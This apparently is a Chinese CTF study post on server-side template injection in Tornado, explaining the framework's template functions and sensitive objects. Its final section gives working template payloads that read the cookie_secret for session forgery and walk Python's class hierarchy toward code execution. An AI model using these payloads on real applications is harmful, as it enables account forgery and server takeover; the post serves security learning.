---
title: SSTI之Tornado
date: 2026-03-19
tags: [SSTI专题]
categories: 
  - web安全
  - Python安全
excerpt: 由[护网杯 2018]easy_tornado 1引起的关于SSTI的学习
---

# Tornado与SSTI

## 关于Tornado

### Tornado简介

Tornado 是一个 Python Web 框架和异步网络库，既能快速搭建网站，也能处理底层网络通信。通过使用非阻塞网络 I/O，Tornado 可以扩展到数万个开放连接，使其成为长轮询、WebSocket 和其他需要与每个用户保持长期连接的应用程序的理想选择。

Tornado 可以粗略地分为三个主要部分：

- 一个 Web 框架（包括 RequestHandler，它被子类化以创建 Web 应用程序，以及各种支持类）。简单来说，就是我们不能直接使用Tornado的原始的`RequestHandler`这个类，而要自己创建一个类继承它。一个这样的web应用，本质上就是由很多这样继承了`RequestHandler`的类组成的。这里给一个简单的源码。

  ```python
  import asyncio
  import tornado
  
  class MainHandler(tornado.web.RequestHandler):
      def get(self):
          self.write("Hello, world")
  
  def make_app():
      return tornado.web.Application([
          (r"/", MainHandler),
      ])
  
  async def main():
      app = make_app()
      app.listen(8888)
      await asyncio.Event().wait()
  
  if __name__ == "__main__":
      asyncio.run(main())
  ```

-  HTTP 的客户端和服务器端实现 (HTTPServer 和 AsyncHTTPClient）。简单来说，Tornado既可以是客户端，也可以是服务器端。Tornado内置了一个由python编写的高性能HTTP服务器(叫HTTPServer)，不需要依赖Apache、Nginx之类的web server，所以可以作为服务器端。Tornado可以作为客户端，是因为有AsyncHTTPClient，它可以用来访问其他网站或者API。

-  一个异步网络库，包括类 IOLoop 和 IOStream，它们作为 HTTP 组件的构建块，也可以用于实现其他协议。

关于Tornado的更多信息，参考[Tornado Web Server — Tornado 6.5.5 文档](https://www.tornadoweb.org/en/stable/index.html)

### 模板引擎部分

#### render()和generate()

`render()`：是`RequestHandler`的方法，主要负责后端与前端页面的交互，用于渲染模板并返回给客户端

`generate()`：是`tornado.template.Template`类或其他底层模板相关类的方法，主要负责模板引擎内部的编译和执行，是`render()`能够工作的基础

`generate()`其实是真正的漏洞触发点，而`render()`一般是调用`generate()`的外壳。一般来说，只要是能在`generate()`执行的payload，都能在`render()`执行。

关于这两个函数的更多信息，参考https://lamaper.github.io/posts/tornado-ssti/#render，这篇文章从tornado的源码部分开始讲解这种函数是这么造成漏洞的。

### Tornado核心敏感对象

在Tornado中，我们一般无法直接访问`os`或者`sys`模块，但我们可以通过内置对象获取敏感信息。

- `handler`：这是最核心的对象，`handler`对象是由`RequestHandler`类实例化得来的，它指向当前的 `RequestHandler`。通过它可以访问请求的所有信息，甚至是服务器的配置。
- `self`：在模板中通常等同于 handler。
- `application`: 指向`tornado.web.Application` 对象。
- `settings`: 这是`application.settings`的简写，通常包含服务器的配置信息。

在利用的时候我们一般可以用`handler.settings`，`handler`指向`RequestHandler`，而`RequestHandler.settings`又指向`self.application.settings`，所以`handler.settings`就指向`RequestHandler.application.settings`了，这里面就是我们的一些环境变量。

### 利用途径

#### 读取Cookie密钥

在`Tornado`中，为了防止cookie被篡改，开发者会设置一个`cookie_secret`。拿到它就可以伪造任意用户的`Session`或`Cookie`(比如伪造管理员)。

##### 常用paylaod

```python
{{handler.application.settings.get('cookie_secret')}}
{{handler.settings['cookie_secret']}}
```

#### RCE

Tornado的 SSTI 实现 RCE 相对 Jinja2 稍显复杂，因为它的沙箱限制有时较多。但基本思路依然是寻找类继承链（Method Resolution Order, MRO）。

```python
{{ handler.__class__.__mro__[1].__subclasses__() }}
```

这样获取到Object类的所有子类，然后进行循环查找：

```python
for i in range(147):
    obj=''.__class__.__base__.__subclasses__()[i].__init__
    if hasattr(obj, '__globals__'):
        print(i,':',obj)
```

用类似于这样的方式进行查找。



